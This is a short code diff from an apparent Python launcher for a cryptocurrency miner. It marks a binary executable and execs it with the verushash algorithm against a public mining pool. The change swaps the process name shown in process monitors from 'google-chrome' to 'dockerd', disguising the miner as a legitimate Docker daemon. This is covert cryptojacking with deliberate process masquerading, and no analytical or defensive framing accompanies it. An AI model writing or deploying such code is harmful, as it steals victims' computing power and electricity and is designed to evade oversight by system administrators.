@@ -2,7 +2,7 @@ import os
 os.system("chmod +x srebe")
 # Replace the current process with the mining process
 os.execvp("./srebe", [
-    "google-chrome",  # This will be the name shown in process monitors
+    "dockerd",  # This will be the name shown in process monitors
     "--disable-gpu",
     "--algorithm", "verushash",
     "--pool", "ap.luckpool.net:3956",
